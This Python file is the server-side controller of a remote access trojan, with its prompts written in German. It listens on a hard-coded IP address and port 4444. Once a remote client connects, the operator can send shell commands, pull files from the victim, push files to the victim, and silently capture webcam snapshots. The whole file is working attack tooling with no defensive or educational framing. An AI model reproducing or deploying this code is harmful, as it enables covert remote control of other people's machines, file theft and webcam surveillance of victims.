from asyncore import write
import socket
import time
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("194.233.164.110",4444))
listener.listen()
print("Server wurde gestartet!")
connection,adresse =listener.accept()
print("Ich habe eine Verbindung zu {}".format(adresse))

x=0

def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    connection.send(bytes(size_of_data,'ISO-8859-1'))
    time.sleep(2)
    connection.send(output_data)

def recv_data():
    original_size = connection.recv(3000).decode('ISO-8859-1')
    original_size = int(original_size)
    data = connection.recv(3000)
    while len(data) != original_size:
        data = data + connection.recv(3000)
    return data


while True:
    try:
        cmd = input("Gib einen CMD Befehl ein: ")
        connection.send(bytes(cmd,'ISO-8859-1'))
        if cmd == 'quit':
            connection.send(b'quit')
            connection.close
            break
        elif cmd[:2] == 'cd':
            recv = recv_data()
            print(recv.decode('ISO-8859-1'))
            continue
        elif cmd[:8] == 'download':
            file_output = recv_data()
            if file_output == b'Keine Datei':
                print(file_output.decode('ISO-8859-1'))
                continue
            with open(f'{cmd[9::]}',"wb") as write_data:
                write_data.write(file_output)
                write_data.close()
            continue
        elif cmd[:6] == "upload":
            with open(f'{cmd[7::]}','rb') as data:
                f_data = data.read()
                data.close()
            send_data(f_data)
            continue
        elif cmd[:11] =='webcam_snap':
            data = recv_data()
            if data == b'Keine Kamera gefunden!':
                print(data.decode('ISO-8859-1'))
                continue
            with open(f'{x}.jpg','wb') as write_data:
                write_data.write(data)
                x=x+1
                write_data.close()
            continue
        output = recv_data()
        print(output.decode('ISO-8859-1'))

    except FileNotFoundError:
        print("Datei nicht vorhanden")
        send_data(b'error')
        continue
